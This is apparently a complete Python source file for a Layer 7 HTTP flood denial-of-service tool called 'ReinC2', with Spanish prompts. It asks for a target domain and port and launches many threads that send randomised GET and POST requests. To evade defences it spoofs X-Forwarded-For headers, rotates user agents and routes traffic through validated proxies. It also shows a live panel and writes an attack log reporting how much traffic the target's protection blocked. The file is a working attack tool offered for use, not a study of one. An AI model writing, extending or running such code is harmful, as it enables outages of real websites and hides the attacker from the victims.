import threading
import time
import requests
from random import choice, randint
import os
from datetime import datetime
import urllib3
from requests.exceptions import ProxyError, ConnectTimeout, SSLError, ReadTimeout, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

request_count = 0
success_count = 0
mitigated_count = 0
error_count = 0
lock = threading.Lock()
last_count = 0
stop_flag = False

valid_proxies = []  # Lista de proxies válidas que usaremos

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_header():
    print(RED + "-" * 55)
    print("Best Bypass & strong Layer 4/7")
    print("-" * 55)
    print("Made by .abc_yxz. & amus")
    print("Type \"Help\" to see all commands.")
    print("-" * 55 + RESET + "\n")

def load_list(filename):
    if not os.path.exists(filename):
        print(f"{RED}❌ Archivo faltante: {filename}{RESET}")
        exit(1)
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def test_target_status(target, port):
    scheme = "http" if port == 80 else "https"
    url = f"{scheme}://{target}"
    try:
        r = requests.get(url, timeout=3, verify=False)
        if r.status_code < 400:
            return "Successfully", GREEN, f"🟢 Web activa - Código HTTP {r.status_code}"
        elif r.status_code in [403, 429, 503, 520, 522, 525]:
            return "Blocked", RED, f"🔴 Protegido o mitigando - Código HTTP {r.status_code}"
        else:
            return "Unavailable", RED, f"🔴 Web inestable - Código HTTP {r.status_code}"
    except:
        return "Unavailable", RED, "🔴 Web caída o sin respuesta"

def print_attack_panel(target, port, duration, status, color, web_status, sent, remaining, rps):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{RED}┌{'─'*51}┐")
    print(f"│{color} Status     : {status:<37}{RESET}│")
    print(f"│ Method     : {'https' if port == 80 else 'https':<45}│")
    print(f"│ Target     : {target:<45}│")
    print(f"│ Port       : {port:<45}│")
    print(f"│ Duration   : {duration:<45}│")
    print(f"│ Sent       : {sent:<45}│")
    print(f"│ RPS        : {rps:<45}│")
    print(f"│ Time Left  : {remaining:<45}│")
    print(f"│ Date       : {now:<45}│")
    print(f"│ Sent by    : amus{'':<42}│")
    print(f"└{'─'*51}┘" + RESET)
    print(f"{color}{web_status}{RESET}\n")

def build_headers(custom_headers, user_agents):
    headers = {}
    for line in custom_headers:
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()
    headers["User-Agent"] = choice(user_agents)
    headers["X-Forwarded-For"] = f"{randint(1,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}"
    headers["Referer"] = choice([
        "https://google.com", "https://bing.com", "https://duckduckgo.com"
    ])
    headers["Accept-Encoding"] = "gzip, deflate"
    headers["Accept-Language"] = "es-ES,es;q=0.9"
    headers["Connection"] = "keep-alive"
    return headers

def flood(target, port, duration, custom_headers, user_agents, proxy=None):
    global request_count, success_count, mitigated_count, error_count, stop_flag
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1000)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    scheme = "http" if port == 80 else "https"
    url = f"{scheme}://{target}"
    end_time = time.time() + duration

    while not stop_flag and time.time() < end_time:
        try:
            for _ in range(25):
                path = f"/?q={randint(1000,999999)}"
                headers = build_headers(custom_headers, user_agents)
                kwargs = {"headers": headers, "timeout":1, "verify": False}
                if proxy:
                    kwargs["proxies"] = {
                        "http": proxy,
                        "https": proxy
                    }
                if randint(0,1):
                    r = session.get(url + path, **kwargs)
                else:
                    r = session.post(url + path, data={"a": randint(100,999)}, **kwargs)

                with lock:
                    request_count += 1
                    if r.status_code < 400:
                        success_count += 1
                    elif r.status_code in [403, 429, 503, 520, 522, 525]:
                        mitigated_count += 1
        except:
            with lock:
                error_count += 1

def check_proxy(proxy: str) -> bool:
    test_url = "http://httpbin.org/ip"
    proxies = {
        "http": proxy,
        "https": proxy,
    }
    try:
        r = requests.get(test_url, proxies=proxies, timeout=3, verify=False)
        return r.status_code == 200
    except (ProxyError, ConnectTimeout, SSLError, ReadTimeout, RequestException):
        return False

def load_and_filter_proxies(filename):
    if not os.path.exists(filename):
        print(f"{RED}❌ Archivo faltante: {filename}{RESET}")
        return []
    raw_proxies = []
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Si proxy no tiene protocolo, asume http://
            if "://" not in line:
                line = "http://" + line
            raw_proxies.append(line)
    print(f"⏳ Analizando proxies de {filename}...")
    valid = []
    for p in raw_proxies:
        if check_proxy(p):
            print(f"✅ Proxy válido: {p}")
            valid.append(p)
        else:
            print(f"[✗] Proxy inválido: {p}")
    print(f"⚡ Proxies válidos totales: {len(valid)} de {len(raw_proxies)}")
    return valid

def monitor(target, port, duration):
    global request_count, last_count, stop_flag
    start = time.time()
    while time.time() - start < duration:
        time.sleep(5)
        with lock:
            current = request_count
            rps = (current - last_count) // 5
            last_count = current
        elapsed = int(time.time() - start)
        remaining = int(duration - elapsed)
        sent = current
        status, color, web_status = test_target_status(target, port)
        clear()
        print_header()
        print_attack_panel(target, port, duration, status, color, web_status, sent, remaining, rps)
    stop_flag = True

def save_log(target, port, duration):
    end = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with lock:
        total = request_count if request_count > 0 else 1
        success_perc = (success_count/total)*100
        mitigated_perc = (mitigated_count/total)*100
        error_perc = (error_count/total)*100
        with open("attack_log.txt", "a") as f:
            f.write(f"\n👑 {target} 👑\n\n")
            f.write(f"⚙️ Unknown or No WAF detected\n\n")
            f.write("🦄 Total Count:\n\n")
            f.write(f"All Request\n➥ {request_count}\n\n")
            f.write(f"Request Successful\n➥ {success_count}  ({success_perc:.2f}%)\n\n")
            f.write(f"Request Blocked\n➥ {mitigated_count}  ({mitigated_perc:.2f}%)\n")
            f.write("➖" * 10 + "\n\n")
            f.write("🔫 Allowed Request:\n➖" * 10 + "\n")
            f.write(f"➥ HTTP Protocol: {'http' if port==80 else 'https'}\n")
            f.write(f"➥ HTTP ResponseStatus: 200\n")  # Podrías mejorarlo sacando el último status real
            f.write(f"➥ Count: {request_count}\n")
            f.write("➖" * 10 + "\n")
            f.write(f"➥ Count: {request_count}\n")
            f.write(f"➥ Percentage: 100.00%\n")
            f.write("➖" * 10 + "\n\n")
            f.write("🚁 Bypassed Request:\n➖" * 10 + "\n")
            f.write("➥ Count: 0\n")
            f.write("➥ Percentage: 0.00%\n")
            f.write("➖" * 10 + "\n\n")
            f.write("🛡 Blocked Request:\n➖" * 10 + "\n")
            f.write(f"➥ Count: {mitigated_count}\n")
            f.write(f"➥ Percentage: {mitigated_perc:.2f}%\n")
            f.write("➖" * 10 + "\n\n")
            f.write(f"⌛ Timeout Requests\nErrores timeout:\n➥ Error Timeout Requests: {error_count} {error_perc:.2f}% (total)\n")
            f.write(f"➥ Duración del ataque: {duration} segundos\n")
            f.write("➖" * 10 + "\n")

def main():
    global request_count, success_count, mitigated_count, error_count, last_count, stop_flag, valid_proxies
    requests.packages.urllib3.disable_warnings()
    clear()
    print_header()

    target = input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Dominio/IP objetivo: ").strip()
    port = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Puerto (80/443): ").strip())
    use_proxies = input(f"{RED}[ amus • ReinC2 ] ▶{RESET} ¿Quieres integrar proxies? S/N: ").strip().lower() == 's'

    valid_proxies = []
    if use_proxies:
        valid_proxies = load_and_filter_proxies("proxies.txt")
        if not valid_proxies:
            print(f"{RED}❌ Ninguna proxy válida encontrada, el ataque usará tu IP local.{RESET}")
            use_proxies = False
        else:
            ip_attack = input(f"{GREEN}¿Quieres usar tu IP local en el ataque además de las proxies? S/N: {RESET}").strip().lower()
            use_local_ip = ip_attack == 's'
    else:
        use_local_ip = True

    threads = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Hilos: ").strip())
    duration = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Duración (seg): ").strip())

    custom_headers = load_list("headers.txt")
    user_agents = load_list("useragents.txt")

    request_count = success_count = mitigated_count = error_count = last_count = 0
    stop_flag = False

    monitor_thread = threading.Thread(target=monitor, args=(target, port, duration), daemon=True)
    monitor_thread.start()

    thread_list = []
    for i in range(threads):
        proxy = None
        if use_proxies:
            proxy = choice(valid_proxies)
        elif use_local_ip:
            proxy = None
        else:
            proxy = None

        t = threading.Thread(target=flood, args=(target, port, duration, custom_headers, user_agents, proxy))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    save_log(target, port, duration)
    print(f"\n{GREEN}[ ReinC2 ] Ataque finalizado. Stats guardadas en attack_log.txt{RESET}")
    input(f"{RED}Presiona Enter para volver...{RESET}")

if __name__ == "__main__":
    main()
